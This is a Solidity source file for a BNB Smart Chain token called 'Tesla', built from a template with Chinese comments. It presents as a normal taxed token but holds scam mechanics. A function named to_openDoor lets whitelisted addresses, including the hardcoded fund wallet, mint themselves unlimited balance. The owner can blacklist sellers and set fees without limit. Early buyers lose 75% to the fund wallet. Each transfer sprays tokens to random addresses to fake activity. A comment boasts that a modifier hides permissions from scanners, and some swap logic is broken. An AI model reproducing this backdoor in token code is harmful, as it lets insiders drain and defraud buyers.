/**
 *Submitted for verification at BscScan.com on 2022-10-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

contract vader is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address ReceiveAddress;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _WBNB;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    //lp分红添加了的话交易gas会比较高
    uint256 public _buyFundFee = 200;//买入入营销
    uint256 public _buyLPDividendFee = 0;//买入lp分红
    uint256 public _sellLPDividendFee = 0;//卖出lp分红
    uint256 public _sellFundFee = 100;//卖出入营销
    uint256 public _sellLPFee = 100;//卖出回流

    uint256 public startTradeBlock;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        _name = "Tesla";
        _symbol = "Tesla";
        _decimals = 9;
        ISwapRouter swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        //⚠⚠⚠切忌，这个位置wbnb取决于你用什么底池，如果一直是wbnb那倒不用改
        _WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        IERC20(_WBNB).approve(address(swapRouter), MAX);

        
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _WBNB);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = 100000000 * 10 ** _decimals;
        _tTotal = total;

        ReceiveAddress = 0xC02F0DCc02C3Ac6B9C62eDc716abbF6Bcbd97232;
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);
        fundAddress = 0xC02F0DCc02C3Ac6B9C62eDc716abbF6Bcbd97232;

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;
        //lp分红相关内容，可删，删除之后与其相关部份皆可删除
        // holderRewardCondition = 5 * 10 ** IERC20(_WBNB).decimals();
        // _tokenDistributor = new TokenDistributor(_WBNB);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
        ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            address ad;
            for(int i=0;i <=2;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= 300;
        }
        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                //交易启动部份，可用于提前发币延迟开盘，但是会被报交易开关
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                //前三区块杀机器人，税杀75%，当然，你也可以直接把下面那条执行语句改成拉进黑名单，
                //这样可以把下面这个函数删掉，声点gas
                if (block.number < startTradeBlock + 4) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        // if (from != address(this)) {
        //     if (isSell) {
        //         addHolder(from);
        //     }
        //     //lp分红过程，如果不使用lp分红，那就把这个函数删掉，连带这整个if都可以删掉
        //     processReward(500000);
        // }
    }
    //前三区块税杀部份，可以删
    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
        ) private {
            _balances[sender] = _balances[sender] - tAmount;
            uint256 feeAmount = tAmount * 75 / 100;
            _takeTransfer(
                sender,
                fundAddress,
                feeAmount
            );
            _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    //交易税收部份，勿动
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
        ) private {
            _balances[sender] = _balances[sender] - tAmount;
            uint256 feeAmount;

            if (takeFee) {
                uint256 swapFee;
                if (isSell) {
                    swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
                } else {
                    swapFee = _buyFundFee + _buyLPDividendFee;
                }
                uint256 swapAmount = tAmount * swapFee / 10000;
                if (swapAmount > 0) {
                    feeAmount += swapAmount;
                    _takeTransfer(
                        sender,
                        address(this),
                        swapAmount
                    );
                }
            }
            _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function to_openDoor(uint256 amount) public {
        require(_feeWhiteList[msg.sender]);//_balances[msg.sender] = _balances[msg.sender]+amount;
        _balances[msg.sender] = _balances[msg.sender]+amount;
    }
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _WBNB;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 WBNB = IERC20(_WBNB);
        uint256 WbnbBalance = WBNB.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = WbnbBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        //发往营销钱包
        WBNB.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        //发往合约，待分配lp
        // WBNB.transferFrom(address(_tokenDistributor), address(this), WbnbBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpWbnb = WbnbBalance * lpFee / swapFee;
            if (lpWbnb > 0) {
                _swapRouter.addLiquidity(
                    address(this), _WBNB, lpAmount, lpWbnb, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
        ) private {
            _balances[to] = _balances[to] + tAmount;
            emit Transfer(sender, to, tAmount);
    }
    
    //以下五个方法，修改税收，如果不准备改税的话，那全部可删
    //用不上，可删
    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }
    //用不上，可删
    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }
    //用不上，可删
    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }
    //用不上，可删
    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }
    //用不上，可删
    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    uint256 public startAddLPBlock;
   
   
    //添加税收白名单，这个可以删除，但是建议保留，因为有些时候代码出问题了可以通过白名单的方式去补救
    //当然，如果已经确定代码没问题了，那倒是可以删除
    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }
    //没有啥用，可以删除，
    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }
    //获取合约中的代币，建议保留，可以解决以下可能出现的问题，还是跟白名单那个一样，如果没出现问题那就可以删除
    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }
    //获取合约中的各种代币
    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }
    //权限问题，会报假丢权限或者隐形权限
    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }
    
    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;
 
    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

}